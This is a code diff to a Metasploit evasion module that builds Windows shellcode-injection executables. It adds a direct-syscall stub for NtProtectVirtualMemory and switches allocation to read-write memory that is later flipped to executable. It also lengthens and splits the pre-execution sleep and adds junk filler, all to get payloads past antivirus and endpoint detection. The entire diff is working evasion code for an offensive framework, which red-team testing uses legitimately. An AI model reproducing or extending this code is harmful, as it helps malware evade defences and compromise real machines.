@@ -28,7 +28,7 @@ class MetasploitModule < Msf::Evasion
     register_options(
       [
         OptEnum.new('CIPHER', [ true, 'Shellcode encryption type', 'xor', ['xor', 'rc4']]),
-        OptInt.new('SLEEP', [false, 'Sleep time before executing shellcode', 10000]),
+        OptInt.new('SLEEP', [false, 'Sleep time before executing shellcode', 20000]),
         OptBool.new('JUNK', [false, 'Add random info to the final executable', true])
       ]
     )
@@ -136,6 +136,26 @@ class MetasploitModule < Msf::Evasion
         mov r10, rcx \\n\\
         syscall                    \\n\\
         ret \\n\\
+    ");
+    ^
+  end
+
+  def nt_protect
+    %^
+    __asm__("NtProtectVirtualMemory: \\n\\
+    push rcx \\n\\
+    push rdx \\n\\
+    push r8 \\n\\
+    push r9 \\n\\
+    mov ecx, 0x#{calc_hash 'NtProtectVirtualMemory'} \\n\\
+    call GetSyscallNumber  \\n\\
+    pop r9  \\n\\
+    pop r8 \\n\\
+    pop rdx \\n\\
+    pop rcx \\n\\
+    mov r10, rcx \\n\\
+    syscall           \\n\\
+    ret \\n\\
     ");
     ^
   end
@@ -257,6 +277,13 @@ class MetasploitModule < Msf::Evasion
             IN OUT PSIZE_T RegionSize,
             IN ULONG AllocationType,
             IN ULONG Protect);
+
+        EXTERN_C NTSTATUS NtProtectVirtualMemory(
+            IN HANDLE ProcessHandle,
+            IN OUT PVOID * BaseAddress,
+            IN OUT PSIZE_T RegionSize,
+            IN ULONG NewProtect,
+            OUT PULONG OldProtect);
 
         EXTERN_C NTSTATUS NtCreateThreadEx(
             OUT PHANDLE ThreadHandle,
@@ -435,20 +462,22 @@ class MetasploitModule < Msf::Evasion
   end
 
   def inject
-    s = "Sleep(#{datastore['SLEEP']})"
+    s = "int i; for(i=0;i<10;i++){Sleep(#{datastore['SLEEP']} / 10);}"
     @inject = %@
 
         void inject()
         {
             HANDLE pHandle;
+            DWORD old = 0;
             CLIENT_ID cID = {0};
             OBJECT_ATTRIBUTES OA = {0};
             SIZE_T size = sizeof(shellcode);
             PVOID bAddress = NULL;
             int process_id = GetCurrentProcessId();
+            #{filler if datastore['JUNK']}
             cID.UniqueProcess = process_id;
             NtOpenProcess(&pHandle, PROCESS_ALL_ACCESS, &OA, &cID);
-            NtAllocateVirtualMemory(pHandle, &bAddress, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            NtAllocateVirtualMemory(pHandle, &bAddress, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
             int n = 0;
             @
     if datastore['CIPHER'] == 'rc4'
@@ -472,7 +501,8 @@ class MetasploitModule < Msf::Evasion
             @
     end
     @inject << %@
-            #{s if datastore['SLEEP'] > 0};
+            #{filler if datastore['JUNK']}
+            NtProtectVirtualMemory(pHandle, &bAddress, &size, PAGE_EXECUTE, &old);
             #{s if datastore['SLEEP'] > 0};
             HANDLE thread = NULL;
             NtCreateThreadEx(&thread, THREAD_ALL_ACCESS, NULL, pHandle, exec, bAddress, NULL, NULL, NULL, NULL, NULL);
@@ -538,6 +568,7 @@ class MetasploitModule < Msf::Evasion
     src << nt_close
     src << nt_create_thread
     src << nt_open_process
+    src << nt_protect
     src << nt_write
     src << syscall_parser
     src << exec_func
